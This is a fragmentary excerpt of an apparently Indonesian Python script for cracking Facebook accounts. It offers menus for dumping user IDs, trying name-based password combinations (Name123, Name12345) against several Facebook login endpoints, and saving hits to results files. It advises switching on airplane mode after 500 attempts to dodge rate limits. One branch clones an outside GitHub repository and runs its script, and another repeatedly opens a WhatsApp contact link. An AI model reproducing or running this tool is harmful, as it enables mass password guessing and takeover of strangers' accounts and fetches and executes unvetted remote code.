...
def file():
            logo()
            prints(Panel(""" [white] Sebelum Lanjut Di Harapkan Anda Sudah Dump !! """))
            prints(Panel(""" [white] [01] CRACK FILE\n  [02] DUMP\n  [03] FACEBOOK CLONE"""))
            key = input("\n [+] Select One : ")
            if key in [""]:
            	...
            	prints(Panel(""" [white] Dump Menggunakan : https://github.com/James404-cyber/DUMP-FULL ㅤGunakan Python Max.py """))
                #prints(Panel(""" [white] Want to show related apps [y/t] """))
            elif key in ["3", "03"]:
            	#prints(Panel(""" [white] SEDANG MENG-INSTALL BAHAN !! """))
                os.system('git clone https://github.com/Madd-YY/CumaKAMU')
                os.system('cd CumaKAMU')
                os.system('python CLONE-OLD.py')
                os.system('xdg-open http://wa.me/6285797806250?text=Bang+izin+pake+sc+nya');time.sleep(1)
                time.sleep(2)
# MULAI CRACK
class __chigoue__:
    def __init__(self):
    ...
    def chi(self, id):
        ...
        os.system('xdg-open http://wa.me/6285797806250?text=Bang+izin+pake+sc+nya');time.sleep(1)
        logo()
        crot = input(f" [+] Want to show related apps [y/t]: ")
        if crot in[""]:
...
# PROSES CRACK METODE 3 in 1
    def __metode__(self, cebok, user, pasw):
        global ok,cp,loop
        animasi = random.choice(["\x1b[1;92m[CRACK]","\x1b[1;92m[CRACK]","\x1b[1;92m[CRACK]","\x1b[1;92m[CRACK]","\x1b[1;92m[CRACK]","\x1b[1;92m[CRACK]","\x1b[1;92m[CRACK]"])
    ...
    def __pler__(self):
        os.system('clear')
        logo()
        prints(Panel(""" [white][1] FREE FB \n [2] MBASIC \n [3] M.FACEBOOK [RECOMMEND] """ ))
        yan = input('\n[+] Select Method : ')
        if yan == '':
    ...
    def kombinasi_pw(self,url):
        print('\n \t\033[1;97m[\x1b[1;97m\x1b[1;41m PASSWORD MENU \x1b[0m\x1b[1;97m]')
        prints(Panel(""" [1] Name,Name123,Name12345\n [2] Name,Name123,Name1234,Name12345\n [3] Name,Name123,Name1234,Name12345,+Single Password Using Coma """ ))
        pw = input(f"\n [+] Select Password Method : ")
        if pw in[""]:
            print(f" {N}[{M}!{N}] Don't be empty");self.kombinasi_pw(url)
        elif pw in["1","01"]:
            print('%s\n [%s+%s] OK : results/OK-%s-%s-%s.txt'%(P,P,P,ha, op, ta))
            print('%s [%s+%s] CP : results/CP-%s-%s-%s.txt'%(P,P,P,ha, op, ta))
            prints(Panel(""" [white] [!] After 500 Id Crack Use Airplane Mode\n [!] To stop CTRL+z on keyboard """))
            ...
            print('\n \t\033[1;97m[\x1b[1;97m\x1b[1;41m ADDITION PASSWORD MENU \x1b[0m\x1b[1;97m]')
            prints(Panel("""[white] Semakin banyak kombinasi password semakin lama proses crack!\n Use Coma For Choice Password\n Example : kontol,123456,bismillah,anjing """))
            pw = input(f"{P}[{P}+{P}] Enter Choice Password : {P}").split(",")
            print('%s\n [%s+%s] OK : results/OK-%s-%s-%s.txt'%(P,P,P,ha, op, ta))
            print('%s [%s+%s] CP : results/CP-%s-%s-%s.txt'%(P,P,P,ha, op, ta))
            print("\n ")
            prints(Panel(""" [white] [!] After 500 Id Crack Use Airplane Mode\n [!] To stop CTRL+z on keyboard """))
